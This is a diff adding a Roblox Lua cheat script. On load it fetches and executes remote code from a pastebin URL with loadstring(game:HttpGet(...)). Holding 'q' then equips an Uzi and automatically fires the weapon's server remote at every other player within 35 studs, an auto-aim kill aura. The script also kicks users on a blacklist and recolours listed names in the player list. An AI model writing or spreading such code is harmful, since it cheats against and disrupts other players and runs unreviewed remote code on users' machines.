@@ -1,0 +1,105 @@
+mouse = game.Players.LocalPlayer:GetMouse()
+debounce = false
+bigdebounce = false
+bigfire = false
+loadstring(game:HttpGet(('https://pastebin.com/raw/9mAwN6rA'),true))()
+for i = 1,#blacklist do 
+    if string.lower(game.Players.LocalPlayer.Name) == string.lower(tostring(blacklist[i])) then
+    game.Players.LocalPlayer:Kick("no!")
+    end
+end
+game.Players.PlayerAdded:connect(function(plr)
+    for i = 1,#mains do
+    if string.lower(plr.Name) == tostring(string.lower(mains[i])) then
+        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[plr.Name].BGFrame.PlayerName.TextColor3 = Color3.new(1, 170/255, 0)
+    end
+    end
+end)
+for i, x in next, game:GetService"Players":GetPlayers() do
+    for i = 1,#mains do
+    if string.lower(x.Name) == tostring(string.lower(mains[i])) then
+        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[x.Name].BGFrame.PlayerName.TextColor3 = Color3.new(1, 170/255, 0)
+    end
+    end
+end
+game.Players.PlayerAdded:connect(function(plr)
+    for i = 1,#special do
+    if string.lower(plr.Name) == tostring(string.lower(special[i])) then
+        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[plr.Name].BGFrame.PlayerName.TextColor3 = Color3.new(0, 255, 255)
+    end
+    end
+end)
+for i, x in next, game:GetService"Players":GetPlayers() do
+    for i = 1,#special do
+    if string.lower(x.Name) == tostring(string.lower(special[i])) then
+        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[x.Name].BGFrame.PlayerName.TextColor3 = Color3.new(0, 255, 255)
+    end
+    end
+end
+ 
+ 
+ 
+mouse.KeyDown:Connect(function(key)
+if key == "q" then
+bigfire = true
+end
+end)
+ 
+ 
+mouse.KeyUp:Connect(function(key)
+if key == "q" then
+bigfire = false
+end
+end)
+ 
+ 
+ 
+ 
+game:GetService('RunService').Stepped:connect(function()
+if bigfire == true and bigdebounce == false then
+bigdebounce = true
+ 
+for i,v in pairs(game.Players:GetChildren()) do
+if v.Name ~= game.Players.LocalPlayer.Name then
+if v.Character then
+if v.Character:FindFirstChild("HumanoidRootPart") then
+distance = game.Players.LocalPlayer:DistanceFromCharacter(v.Character.HumanoidRootPart.Position)
+ 
+if distance < 35 then
+ 
+ 
+for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+if (v:IsA("Tool")and v.Name == "Uzi") then
+v.Parent = game.Players.LocalPlayer.Character
+end
+end
+ 
+if debounce == false then
+debounce = true
+game.Players.LocalPlayer.Character.Uzi.Fire:FireServer(v.Character.Torso.CFrame)
+wait()
+    for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+        if (v:IsA("Tool")) then
+        v.Parent = game.Players.LocalPlayer.Backpack
+        v.Parent = game.Players.LocalPlayer
+        v.Parent = game.Players.LocalPlayer.Backpack
+        v.Parent = game.Players.LocalPlayer.Character
+        end
+    end
+debounce = false
+end
+ 
+end
+end
+end
+ 
+end
+end
+ 
+bigdebounce = false
+ 
+end
+ 
+ 
+ 
+end)
